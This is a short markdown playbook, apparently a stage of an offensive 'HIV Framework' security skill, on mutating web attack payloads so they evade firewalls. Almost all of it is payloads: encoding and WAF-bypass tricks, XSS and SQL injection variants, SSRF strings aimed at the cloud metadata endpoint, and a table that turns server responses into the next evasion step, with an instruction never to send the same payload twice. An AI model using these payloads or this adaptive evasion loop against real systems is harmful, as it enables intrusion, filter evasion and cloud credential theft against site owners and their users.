# Stage 3: Reverse Transcriptase — Payload Transformation

> HIV: RNA → DNA tanpa error-correction → mutasi konstan.
> Payload: transform exploit untuk bypass filter, lalu vary terus.

## Encoding Pipeline

```
RAW → [URL encode] → [Context adapt] → [WAF bypass] → [Delivery]
```

### Layer 1: Basic Encoding
```
URL:         %3Cscript%3E
Double URL:  %253Cscript%253E
HTML entity: &lt;script&gt;
Unicode:     \u003cscript\u003e
```

### Layer 2: WAF-Specific
```
Case:    ScRiPt
Comment: sc/**/ript
Null:    scr\x00ipt
Tab:     sc\tipt
Split:   payload split across multiple params
```

## XSS Mutation Set (Never Send Same Twice)
```javascript
<script>alert(1)</script>
<ScRiPt>alert`1`</ScRiPt>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<video src onerror=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
```

## SQLi Mutation Set
```sql
' OR 1=1--
'/**/OR/**/1=1--
'%09OR%091=1--
' /*!OR*/ 1=1--
' OR SLEEP(1)--
' OR ASCII(49)=49--
```

## SSRF Mutation Set
```
http://169.254.169.254/
http://[::ffff:169.254.169.254]/
http://0xa9fea9fe/
http://2852039166/
dict://169.254.169.254:80/
gopher://169.254.169.254:80/_GET%20/
```

## Adaptive Response

```
403 → WAF triggered → mutate encoding harder
400 → syntax error → adjust structure
200 + no reflection → wrong vector → rotate
200 + reflection → confirm execution
500 → probe boolean/error based
delay → confirm time-based
```

*Stage 3: Reverse Transcriptase | HIV Framework | Security--Skill*
